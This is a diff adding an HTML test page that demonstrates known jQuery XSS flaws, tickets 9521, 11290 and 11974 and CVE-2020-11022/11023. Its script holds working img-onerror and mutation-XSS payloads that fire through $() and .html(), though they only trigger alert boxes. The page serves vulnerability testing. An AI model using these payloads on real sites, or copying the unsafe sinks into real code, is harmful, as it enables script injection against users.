@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Jquery XSS</title>
+    <script type="text/javascript" src="https://xxxx.xxx/jquery/jquery.js"></script>
+</head>
+
+<body>
+    <h1>jQuery with XSS</h1>
+    <h2>Demo：</h2>
+    <p style="color:red;">Note: Source code changes jQuery version，As long as there is no bullet window, there will be no problem.！</p>
+    <div class="payloadTest">
+        <div class="payload">
+            <ul>
+        <!-- 9521 -->
+                <li>
+                    <a href="#9521" onclick="xss(9521)">XSS-bug-9521</a>
+                    =>
+                    <a href="https://bugs.jquery.com/ticket/9521" target="_blank">ticket</a>
+                </li>
+        <!-- 11920 -->
+                <li>
+                        <a href="#11290" onclick="xss(11290)">XSS-bug-11290</a>
+                        =>
+                        <a href="https://bugs.jquery.com/ticket/11290" target="_blank">ticket</a>
+                </li>
+        <!-- 11974 -->
+                <li>
+                    <a href="#11974" onclick="xss(11974)">XSS-bug-11974</a>
+                    =>
+                    <a href="https://bugs.jquery.com/ticket/11974"target="_blank">ticket</a>
+                </li>
+            </ul>
+        </div>
+<!-- CVE-2020-11022/CVE-2020-11023 -->
+        <div class="payload">
+            <ul>
+                <li>
+                    <a href="#CVE-2020-11022/11023 poc1" id="CVEXSS" onclick="CVEXSS(1)">CVE-2020-11022/11023 POC1</a>
+                </li>
+                <li>
+                    <a href="#CVE-2020-11022/11023 poc2" id="CVEXSS" onclick="CVEXSS(2)">CVE-2020-11022/11023 POC2</a>
+                </li>
+                <li>
+                    <a href="#CVE-2020-11022/11023 poc3" id="CVEXSS" onclick="CVEXSS(3)">CVE-2020-11022/11023 POC3</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <h2>Test version：</h2>
+    <ul>
+        <li><a href="http://research.insecurelabs.org/jquery/test/" target="_blank">test result</a></li>
+    </ul>
+    <h2>Safe version：</h2>
+    <ul>
+        <li>1.12.0, 1.12.1 </li>
+        <li>2.2.0, 2.2.1</li>
+        <li>3.0.0, 3.0.1, 3.1.0, 3.1.1</li>
+    </ul>
+    <div data-val='#<img src="x" onerror="console.log(xss!)">'><div>
+    <div id="testDiv"></div>
+</body>
+</html>
+<script type="text/javascript">
+    var poc = '';
+// 9521\11290
+    function xss(n){
+        switch(n){
+            case 9521:
+                poc = '#<img src="x" onerror="alert(\'xss9521\')">';
+                break;
+            case 11290:
+                poc = 'div[data-val="<img src="x" onerror="alert(\'xss11290\')">"]';
+                break;
+            case 11974:
+                poc = "<img src='z' onerror='alert(\"bug-11974\")'>";
+                break;
+        }
+        $(poc).appendTo("body");
+    }
+
+// #11974
+    function xss11974(){
+        $("<img src='z' onerror='alert(\"bug-11974\")'>");
+        // $.parseHTML("<img src='z' onerror='alert(\"bug-11974\")'>");
+    }
+
+// CVE-2020-11022/CVE-2020-11023
+    function CVEXSS(n){
+        switch(n){
+            case 1:
+                poc = '<style><style /><img src=x onerror=alert("CVE-2020-11022/CVE-2020-11023")>';
+                break;
+            case 2:
+                poc = '<img alt="<x" title="/><img src=x onerror=alert("CVE-2020-11022/CVE-2020-11023")>">';
+                break;
+            case 3:
+                poc = '<option><style></option></select><img src=x onerror=alert("CVE-2020-11022/CVE-2020-11023")></style>';
+                break;
+        }
+        $('#testDiv').html(poc);
+    }
+</script>
